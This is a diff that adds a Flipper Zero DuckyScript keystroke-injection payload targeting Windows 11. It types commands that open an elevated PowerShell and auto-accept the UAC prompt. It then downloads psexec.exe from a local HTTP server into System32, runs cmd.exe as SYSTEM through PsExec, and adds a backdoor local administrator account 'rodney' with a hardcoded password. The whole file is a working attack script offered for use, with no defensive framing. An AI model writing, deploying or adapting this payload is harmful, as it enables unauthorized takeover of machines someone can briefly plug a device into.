@@ -1,0 +1,47 @@
+REM Author: sasquatchchicken
+REM Version 1.0 (Flipper Ducky)
+REM Target: windows 11
+DELAY 500
+REM Open PowerShell with administrative privileges
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs"
+ENTER
+DELAY 500
+ALT y  
+DELAY 2000
+REM Download PsExec from Python server to temp folder
+STRING Invoke-WebRequest -Uri "http://192.168.1.15:8080/psexec.exe" -OutFile "$env:TEMP\psexec.exe"
+ENTER
+DELAY 2000
+REM Copy PsExec to C:\Windows\System32
+STRING Copy-Item -Path "$env:TEMP\psexec.exe" -Destination "C:\Windows\System32" -Force
+ENTER
+DELAY 2000
+REM Enumerate tokens for all processes and impersonate winlogon.exe
+STRING $processes = Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "winlogon.exe" }
+ENTER
+DELAY 1500
+STRING foreach ($process in $processes) {
+ENTER
+DELAY 1500
+STRING $handle = (Start-Process -FilePath "C:\Windows\System32\psexec.exe" -ArgumentList "-accepteula -s -d -i $($process.ProcessID) cmd.exe").Handle
+ENTER
+DELAY 1500
+STRING Write-Host "Impersonating Token for PID $($process.ProcessID)"
+ENTER
+DELAY 1500
+REM password must 14 or less characters
+STRING net user rodney TestPasswd23! /add
+ENTER
+DELAY 1500
+STRING net localgroup administrators rodney /add
+ENTER
+DELAY 1500
+STRING }
+ENTER
+DELAY 1000
+REM Close PowerShell window
+STRING exit
+ENTER
+
